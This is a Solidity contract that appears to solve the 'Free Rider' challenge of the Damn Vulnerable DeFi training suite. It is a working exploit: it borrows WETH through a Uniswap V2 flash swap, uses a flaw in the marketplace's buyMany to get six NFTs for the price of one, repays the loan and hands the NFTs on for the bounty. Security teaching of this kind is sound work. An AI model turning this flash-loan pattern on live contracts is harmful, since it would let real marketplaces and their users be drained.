// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "./FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";

contract FreeRiderExploiter {
    WETH weth;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    address player;

    constructor(
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft,
        WETH _weth,
        FreeRiderRecoveryManager _recoveryManager
    ) {
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = _nft;
        weth = _weth;
        recoveryManager = _recoveryManager;
        player = msg.sender;
    }

    function trigger() public {
        // Data is required by UniSwapPair.sol
        uniswapPair.swap(NFT_PRICE, 0, address(this), "1");
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == address(uniswapPair), "Invalid caller");

        // convert to ETH
        weth.withdraw(NFT_PRICE);

        // prepare the buy id array: [0, 1, 2, 3, 4, 5]
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            ids[i] = i;
        }
        // abuse the buyMany
        marketplace.buyMany{value: NFT_PRICE}(ids);

        // Repay the uniswapPair and the 0.3% fee (1004 since rounding)
        uint256 amountRequired = (NFT_PRICE * 1004) / 1000; // Includes 0.3% fee
        weth.deposit{value: amountRequired}(); // Convert ETH back to WETH
        weth.transfer(address(uniswapPair), amountRequired); // Payback loan

        // transfer the NFT to the recovery via safeTransferFrom
        bytes memory _data = abi.encode(player);
        for (uint256 i = 0; i < 6; i++) {
            nft.approve(address(recoveryManager), ids[i]);
            nft.safeTransferFrom(address(this), address(recoveryManager), ids[i], _data);
        }
    }

    // handle to recieve the NFT
    function onERC721Received(address, address, uint256, bytes memory) external view returns (bytes4) {
        return recoveryManager.onERC721Received.selector;
    }

    receive() external payable {}
}
